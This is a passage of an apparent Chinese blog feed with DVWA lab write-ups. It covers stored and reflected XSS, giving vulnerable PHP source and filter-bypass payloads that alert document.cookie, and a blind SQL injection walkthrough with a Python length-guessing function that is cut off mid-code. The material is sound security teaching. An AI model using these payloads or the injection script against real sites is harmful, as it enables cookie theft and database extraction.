    <title>DVWA--xss_stored</title>
    <link href="https://1187100546.github.io/2019/11/14/xss-stored/"/>
    <id>https://1187100546.github.io/2019/11/14/xss-stored/</id>
    <published>2019-11-14T13:12:02.000Z</published>
    <updated>2019-11-14T14:31:00.757Z</updated>
    
    <content type="html"><![CDATA[<p>DVWA的存储型xss。</p><a id="more"></a><h2 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h2><h3 id="Stored-XSS-Source"><a href="#Stored-XSS-Source" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p> <code>isset()</code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false </p><p> <code>trim()</code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p><p> <code>stripslashes()</code> 函数用于删除字符串中的反斜杠 </p><p> <code>mysqli_real_escape_string()</code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a)</code> 进行转义 </p><p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p><p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>由于name和message输入框均存在xss。但name输入框有字符限制，这里可以使用burpsuite抓包修改name输入框内容： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MUAK3Q.png" alt="MUAK3Q.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUAQjs.png" alt="MUAQjs.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUA1un.png" alt="MUA1un.png"></p><p>*<em>由于提交的结果存储在数据库中，所以每次刷新页面，输入的恶意代码就会被执行一次 *</em></p><h2 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h2><h3 id="Stored-XSS-Source-1"><a href="#Stored-XSS-Source-1" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p><p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p><p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p><p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码<br>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。 </p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p> 抓包修改name输入内容:</p><ol><li>使用双写绕过，输入  <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>使用大小写绕过，输入<code>&lt;sCript&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>输入其他标签，如  <code>&lt;IMG src=1 onerror=alert(document.cookie)&gt;</code></li></ol><p><img src="https://s2.ax1x.com/2019/11/14/MUmpy4.png" alt="MUmpy4.png"></p><p><strong>由于low级别已经注入过，所以打开medium级别会直接弹出cookie</strong></p><h2 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h2><h3 id="Stored-XSS-Source-2"><a href="#Stored-XSS-Source-2" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>和上面两个级别一样，抓包修改name内容即可，代码对name输入内容利用正则匹配删除所有关于<code>&lt;script&gt;</code>标签</p><h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><p>抓包修改name内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DVWA的存储型xss。&lt;/p&gt;
    
    </summary>
    
    
      <category term="xss攻击" scheme="https://1187100546.github.io/categories/xss%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="xss攻击" scheme="https://1187100546.github.io/tags/xss%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA--xss_reflected</title>
    <link href="https://1187100546.github.io/2019/11/14/xss-reflected/"/>
    <id>https://1187100546.github.io/2019/11/14/xss-reflected/</id>
    <published>2019-11-14T11:14:53.000Z</published>
    <updated>2019-11-14T13:18:25.601Z</updated>
    
    <content type="html"><![CDATA[<p>DVWA上的反射型xss。</p><a id="more"></a><h2 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h2><h3 id="Reflected-XSS-Source"><a href="#Reflected-XSS-Source" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p><p> 输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MNT1gJ.png" alt="MNT1gJ.png"></p><p>查看源码可以发现代码被解释执行了</p><p><img src="https://s2.ax1x.com/2019/11/14/MNTa4O.png" alt="MNTa4O.png"></p><h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MNTxxJ.png" alt="MNTxxJ.png"></p><h2 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h2><h3 id="Reflected-XSS-Source-1"><a href="#Reflected-XSS-Source-1" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p> Medium级别的代码相对于Low级别的代码使用<code>str_replace</code>函数将输入中的<code>&lt;script&gt;</code>删除 </p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol><li>使用双写绕过，输入 <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code> </li><li>使用大小写绕过，输入 <code>&lt;sCript&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>输入其他标签，如<code>&lt;IMG src=1 onerror=alert(document.cookie)&gt;</code></li></ol><p>结果：</p><p><img src="https://s2.ax1x.com/2019/11/14/MNH1mR.png" alt="MNH1mR.png"></p><h2 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h2><h3 id="Reflected-XSS-Source-2"><a href="#Reflected-XSS-Source-2" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p> 可以看到High级别的代码使用了  <code>preg_replace</code> 函数执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 </p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p><code>&lt;script&gt;</code> 标签不管用了，但是可以使用其他标签绕过 </p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MNbeHI.png" alt="MNbeHI.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DVWA上的反射型xss。&lt;/p&gt;
    
    </summary>
    
    
      <category term="xss攻击" scheme="https://1187100546.github.io/categories/xss%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="xss攻击" scheme="https://1187100546.github.io/tags/xss%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA-SQL_Injection_Blind（sql盲注）</title>
    <link href="https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/"/>
    <id>https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/</id>
    <published>2019-11-12T12:26:23.000Z</published>
    <updated>2019-11-13T13:44:55.554Z</updated>
    
    <content type="html"><![CDATA[<p>DVWA的sql盲注。</p><a id="more"></a><p>SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">盲注中常用的几个函数：</span><br><span class="line">substr(a,b,<span class="built_in">c</span>)：从b位置开始，截取字符串a的<span class="built_in">c</span>长度 </span><br><span class="line"><span class="built_in">count</span>()：计算总数 </span><br><span class="line">ascii()：返回字符的ascii码 </span><br><span class="line">length()：返回字符串的长度 <span class="keyword">left</span>(a,b)：从左往右截取字符串a的前b个字符 </span><br><span class="line">sleep(n):将程序挂起n秒</span><br></pre></td></tr></table></figure><p> <strong>手工盲注思路</strong> </p><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p><p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：</span><br><span class="line">1.判断是否存在注入，注入是字符型还是数字型 </span><br><span class="line">2.猜解当前数据库名 </span><br><span class="line">3.猜解数据库中的表名</span><br><span class="line">4.猜解表中的字段名 </span><br><span class="line">5.猜解数据</span><br></pre></td></tr></table></figure><h2 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h2><h3 id="SQL-Injection-Blind-Source"><a href="#SQL-Injection-Blind-Source" class="headerlink" title="SQL Injection (Blind) Source"></a><strong>SQL Injection (Blind) Source</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h3><p> Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种： </p><p><code>User ID exists in the database.与 User ID is MISSING from the database.</code></p><p> 所以这里是SQL盲注漏洞。 </p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p> 输入1 ，发现 </p><p><img src="https://s2.ax1x.com/2019/11/12/M8pniV.png" alt="M8pniV.png"></p><p> 输入 1’， 发现 </p><p><img src="https://s2.ax1x.com/2019/11/12/M8CxaR.png" alt="M8CxaR.png"></p><p> 观察到他这里只会出现正确或者错误的两种页面，判定他是一个布尔盲注 </p><h3 id="获取数据库长度"><a href="#获取数据库长度" class="headerlink" title="获取数据库长度"></a>获取数据库长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.database_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and length(database())=&#123;0&#125;%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.database_length = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"\ncan not get the database_length"</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MGOfVP.png" alt="MGOfVP.png"></p><h3 id="检查页面是否正常"><a href="#检查页面是否正常" class="headerlink" title="检查页面是否正常"></a>检查页面是否正常</h3><figure class="highlight 